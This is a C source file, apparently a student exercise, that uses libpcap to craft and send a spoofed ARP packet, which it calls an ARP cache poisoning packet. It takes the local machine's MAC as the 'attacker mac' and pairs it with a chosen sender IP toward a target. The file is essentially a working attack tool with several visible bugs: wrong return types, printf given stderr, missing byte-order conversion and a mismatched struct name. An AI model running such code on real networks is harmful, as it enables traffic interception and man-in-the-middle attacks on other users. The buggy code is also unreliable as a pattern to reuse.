#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <errno.h>
#include <net/if.h>
#include <linux/if_ether.h>
//#include <pcap.h>

#define ETH_OPCODE 0x806

#define ETHER_TYPE 1 // htype

#define IP_TYPE 0x800 // ptype

#define MAC_LEN 6 // hlen

#define IP_LEN 4 // plen

#define ARP_REQ 1
#define ARP_REP 2
#define RARP_REQ 3
#define RARP_REP 4 // opcode


typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
    uint8_t brod[6];
    uint8_t eth_mac[6];
    uint16_t eth_opcode;
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
    uint8_t pad[18];
};

uint8_t * get_mac(char ** argv)
{
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;
    int i = 0;

    if (sock < 0) {
            perror("socket");
            exit(EXIT_FAILURE);
    }

    printf("%s\n", argv[1]);

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, argv[1], IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
            perror("ioctl");
            exit(EXIT_FAILURE);
    }

    uint8_t * ori_mac = (uint8_t*)malloc(sizeof(uint8_t)*6);

    printf("attacker mac : ");

    for(i=0;i<6;i++) {
            printf("%.2X", (unsigned char) req.ifr_hwaddr.sa_data[i]);
            uint8_t tmp = req.ifr_hwaddr.sa_data[i];
            ori_mac[i] = tmp;
            if (i < 5)
                    printf(":");
    }

    printf("\n");
    close(sock);

    return ori_mac;
}

void fill_sender(arp_hdr *dst, uint8_t * src_buf, char * sender_ip)
{
    for(int i=0; i<6; i++)
    {
        uint8_t tmp = src_buf[i];
        dst->eth_mac[i] = tmp;
        dst->sender_mac[i] = tmp;
    }

    inet_pton(AF_INET, sender_ip , dst->sender_ip);

}

void fill_target(arp_hdr *dst, char * target_ip)
{
    memset(dst->target_mac, 0x00, 6);

    inet_pton(AF_INET, target_ip, dst->target_ip);
}

void fill_others(arp_hdr *dst)
{
    for(int i=0; i<6; i++)
    {
	dst->brod[i] = 0xff;
    }


    dst->eth_opcode = (uint16_t)ETH_OPCODE;
    dst->htype = (uint16_t)ETHER_TYPE;
    dst->ptype = (uint16_t)IP_TYPE;
    dst->hlen = (uint8_t)MAC_LEN;
    dst->plen = (uint8_t)IP_LEN;
    dst->opcode = (uint16_t)ARP_REQ;

    for(int i=0; i<18; i++)
    {
        dst->pad[i] = 0x00;
    }
}

void init_buf(int len)
{
    uint8_t* buf = (uint8_t*)malloc(sizeof(uint8_t) * len);
    if (memset(buf,0x00,len) == -1)
    {
        fprintf(stderr, "mem_err\n");
        exit(-1);
    }
    return buf;
}


int main(int argc, char ** argv)
{
    if(argc != 4)
    {
        printf("invalid argcs\n Usage: Interface sender_ip target_ip\n");
        exit(-1);
    }

    char * sender_ip = argv[2];
    char * target_ip = argv[3];

    /*
    int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if( fd == -1 )
    {
        fprintf(stderr, "Error opening ARP Socket\n");
        exit(EXIT_FAILURE);
    }
    */

    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[100];
    char *dev;
    int i;

    dev = pcap_lookupdev(errbuf);


    if( dev == NULL )
    {
    printf("error %s\n", errbuf);
    exit(1);
    }

    if ( (fp = pcap_open_live(dev, 0x100, 1, 0, errbuf)) == NULL)
    {
    printf(stderr, "Unable to open the Adapter.%s is not supported by Libpcap ", argv[1]);
    return;
    }

    uint8_t* ori_mac = get_mac(argv); // getting attacker's mac addr

    struct arp_hdr *arp_pkt = malloc(sizeof(struct _arp_hdr));

    fill_sender(arp_pkt, ori_mac, sender_ip);
    fill_target(arp_pkt, target_ip);
    fill_others(arp_pkt);

    if(pcap_sendpacket(fp, (const u_char *)arp_pkt, (int)sizeof(struct _arp_hdr)) != 0)
    {
        fprintf(stderr, "send pkt error\n");
        exit(-1);
    }

    fprintf(stdout, "arp cache poisoning pkt sent complete\n\n");
    return 0;

}